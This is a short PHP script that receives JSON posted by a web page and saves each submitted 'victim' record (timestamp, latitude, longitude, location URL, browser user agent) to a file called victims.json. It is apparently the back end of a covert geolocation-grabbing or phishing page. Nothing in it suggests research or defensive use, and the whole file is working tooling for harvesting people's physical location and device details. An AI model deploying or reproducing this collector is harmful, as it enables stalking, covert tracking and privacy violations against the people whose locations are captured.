<?php
$data = json_decode(file_get_contents("php://input"), true);

if ($data) {
    $victim = [
        "timestamp" => $data["timestamp"],
        "latitude" => $data["latitude"],
        "longitude" => $data["longitude"],
        "locationUrl" => $data["locationUrl"],
        "userAgent" => $data["userAgent"]
    ];

    $file = 'victims.json';

    if (!file_exists($file)) {
        file_put_contents($file, json_encode([$victim], JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));
    } else {
        $existing = json_decode(file_get_contents($file), true);
        $existing[] = $victim;
        file_put_contents($file, json_encode($existing, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));
    }

    echo json_encode(["status" => "success"]);
} else {
    echo json_encode(["status" => "no_data"]);
}
?>